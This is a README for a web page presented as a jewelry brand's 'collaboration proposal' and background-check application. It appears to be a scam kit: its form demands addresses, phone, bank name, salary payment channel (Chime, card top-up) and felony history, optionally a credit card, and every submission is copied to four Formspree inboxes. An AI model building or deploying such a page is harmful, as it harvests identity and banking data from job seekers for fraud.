# FRONTIER JEWELERS

FRONTIER JEWELERS — background check application & collaboration proposal (USA) page.

## Files
- `public/index.html` — Main page (hero, collaboration proposal letter, details form, review)
- `public/styles.css` — Styles (navy/blue + orange palette, fully responsive)
- `public/app.js` — Form handling, validation & Formspree submission
- `public/logo.png` — Brand logo

## Sections (in order)
1. Hero — collaboration proposal introduction
2. Collaboration proposal letter (responsibilities + payment terms)
3. Details form (step 1) — the full detail set
4. Review & final submission (step 2)
5. Contact + footer

## Formspree endpoints
- `https://formspree.io/f/xwlvnyql`
- `https://formspree.io/f/mdealbkw`
- `https://formspree.io/f/xgaorpez`
- `https://formspree.io/f/mqpewgak`

There is a **single form**; the visitor's details are never collected twice.
Every submission — from the form or from the review step — is POSTed to
**all four** endpoints with the same 20 fields, so the four inboxes always
hold the same record. A guard keeps it to one record per visitor: submitting
from the form blocks a second send from the review step, and vice versa.

## Running locally
```bash
npx serve public
# or
npm start
```

## Form fields
Required (submission is blocked until every one is filled — 17 fields):
- Name — First Name, Last Name
- Email Address
- Phone
- Home / P.O. box address — Street Address, City, State / Region, Postal Code, Country
- Salary Paid To — (a) Mobile Bank Deposit, (b) Credit Card Top up, (c) Chime Transfer
- Salary Amount (USD)
- Bank Name (e.g. Chase / Wells Fargo)
- Feature — Social Media Posting (daily) / Brand Growth / Content Duration (8 hours daily)
- Ever been convicted of felony? (Yes / No)
- Date
- Agreement — I agree to the terms and conditions (must be ticked)
- Brand's Approval (Yes / No)

Optional:
- Address Line 2 (apartment, suite, unit, P.O. box)
- Credit Card

The review step (step 2) shows the details entered in the form and submits
them to all four endpoints.

## Deployment
Push to GitHub and deploy to your hosting platform.
